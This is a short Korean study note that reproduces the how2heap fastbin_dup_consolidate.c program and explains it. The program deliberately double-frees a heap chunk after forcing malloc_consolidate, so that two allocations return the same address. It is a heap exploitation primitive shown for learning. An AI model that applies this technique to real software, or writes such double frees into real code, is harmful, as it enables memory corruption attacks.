```
layout: post
type: note
title: fastbin dup consolidate
alias: Heap
```

how2heap fastbin_dup_consolidate.c

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main() {
  void* p1 = malloc(0x40);
  void* p2 = malloc(0x40);
  fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);
  fprintf(stderr, "Now free p1!\n");
  free(p1);

  void* p3 = malloc(0x400);
  fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
  fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");
  free(p1);
  fprintf(stderr, "Trigger the double free vulnerability!\n");
  fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
  fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
}
```

p1, p2를 할당하고 p1을 free한 후 large을 할당하면 p1이 smallbin으로 병합이 된다. 그리고 p1을 free하면 다시 fastbin으로 간다. 그 후 malloc() 같은 사이즈를 두 번하면 한번은 p1 fastbin이 들어간 주소를 가져오고 그 다음 p1 smallbin이 들어간 주소를 가져온다. 그러므로 두개의 포인터가 같은 힙 영역을 가르키게 된다.